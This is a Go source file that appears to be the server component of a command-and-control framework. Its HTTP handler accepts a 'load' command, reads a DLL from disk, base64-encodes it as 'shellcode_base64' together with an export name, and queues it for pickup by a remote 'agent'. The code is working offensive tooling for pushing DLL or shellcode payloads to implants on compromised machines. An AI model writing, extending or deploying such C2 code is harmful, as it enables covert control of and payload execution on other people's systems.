package control

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
)

// CommandQueue stores commands ready for agent pickup
type CommandQueue struct {
	PendingCommands []CommandType
	mu              sync.Mutex
}

// Global command queue
var AgentCommands = CommandQueue{
	PendingCommands: make([]CommandType, 0),
}

// CommandType represents a command with its arguments
type CommandType struct {
	Command   string          `json:"command"`
	Arguments json.RawMessage `json:"data,omitempty"`
	JobID     string          `json:"job_id"`
}

type CommandValidator func(json.RawMessage) error

// CommandProcessor processes command-specific arguments (e.g., file loading)
type CommandProcessor func(json.RawMessage) (json.RawMessage, error)

// Registry of valid commands with their validators and processors
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"load": {
		Validator: validateLoadCommand,
		Processor: processLoadCommand,
	},
}

// HTTP handler for receiving commands from clients
func handleCommand(w http.ResponseWriter, r *http.Request) {
	// Instantiate empty struct to receive command we got from client
	var cmdType CommandType

	// Error, and return error to client, if we cannot deserialize
	if err := json.NewDecoder(r.Body).Decode(&cmdType); err != nil {
		log.Printf("ERROR: Failed to decode JSON: %v", err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "error",
			"error":  fmt.Sprintf("Invalid JSON: %v", err),
		})
		return
	}

	// Visually confirm we get the command we expected
	cmdType.Command = strings.ToLower(cmdType.Command) // ADD THIS
	log.Printf("Received command: %s", cmdType.Command)

	// Check if command exists
	cmdConfig, exists := validCommands[cmdType.Command]
	if !exists {
		log.Printf("ERROR: Unknown command: %s", cmdType.Command)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "error",
			"error":  fmt.Sprintf("Unknown command: %s", cmdType.Command),
		})
		return
	}
	log.Printf("A valid command was requested: %s", cmdType.Command)

	// Validate arguments
	if err := cmdConfig.Validator(cmdType.Arguments); err != nil {
		log.Printf("ERROR: Validation failed for '%s': %v", cmdType.Command, err)
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "error",
			"error":  fmt.Sprintf("Validation failed: %v", err),
		})
		return
	}

	// Process arguments (e.g., load file and convert to base64)
	processedArgs, err := cmdConfig.Processor(cmdType.Arguments)
	if err != nil {
		log.Printf("ERROR: Processing failed for '%s': %v", cmdType.Command, err)
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{
			"status": "error",
			"error":  fmt.Sprintf("Processing failed: %v", err),
		})
		return
	}

	// Update command with processed arguments
	cmdType.Arguments = processedArgs
	log.Printf("Processed command arguments: %s", cmdType.Command)

	// Create random JOB ID
	cmdType.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
	log.Printf("Job ID assigned: %s", cmdType.JobID)

	// Queue the validated and processed command
	AgentCommands.addCommand(cmdType)

	// Confirm on the client side command was received
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{
		"status":  "success",
		"message": fmt.Sprintf("Command '%s' accepted", cmdType.Command),
	})

}

// validateLoadCommand validates "load" command arguments from client
func validateLoadCommand(rawArgs json.RawMessage) error {
	if len(rawArgs) == 0 {
		return fmt.Errorf("load command requires arguments")
	}

	var args struct {
		FilePath   string `json:"file_path"`
		ExportName string `json:"export_name"`
	}

	if err := json.Unmarshal(rawArgs, &args); err != nil {
		return fmt.Errorf("invalid argument format: %w", err)
	}

	if args.FilePath == "" {
		return fmt.Errorf("file_path is required")
	}

	if args.ExportName == "" {
		return fmt.Errorf("export_name is required")
	}

	// Check if file exists
	if _, err := os.Stat(args.FilePath); os.IsNotExist(err) {
		return fmt.Errorf("file does not exist: %s", args.FilePath)
	}

	log.Printf("Validation passed: file_path=%s, export_name=%s", args.FilePath, args.ExportName)

	return nil
}

// processLoadCommand reads the DLL file and converts to base64
func processLoadCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
	var clientArgs struct {
		FilePath   string `json:"file_path"`
		ExportName string `json:"export_name"`
	}

	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
		return nil, fmt.Errorf("unmarshaling args: %w", err)
	}

	// Read the DLL file
	file, err := os.Open(clientArgs.FilePath)
	if err != nil {
		return nil, fmt.Errorf("opening file: %w", err)
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		return nil, fmt.Errorf("reading file: %w", err)
	}

	// Convert to base64
	shellcodeB64 := base64.StdEncoding.EncodeToString(fileBytes)

	// Create the arguments that will be sent to the agent
	agentArgs := struct {
		ShellcodeBase64 string `json:"shellcode_base64"`
		ExportName      string `json:"export_name"`
	}{
		ShellcodeBase64: shellcodeB64,
		ExportName:      clientArgs.ExportName,
	}

	processedJSON, err := json.Marshal(agentArgs)
	if err != nil {
		return nil, fmt.Errorf("marshaling processed args: %w", err)
	}

	log.Printf("Processed file: %s (%d bytes) -> base64 (%d chars)",
		clientArgs.FilePath, len(fileBytes), len(shellcodeB64))

	return processedJSON, nil
}

// addCommand adds a validated command to the queue
func (cq *CommandQueue) addCommand(command CommandType) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	cq.PendingCommands = append(cq.PendingCommands, command)
	log.Printf("QUEUED: Command %s with ID %s", command.Command, command.JobID)
}
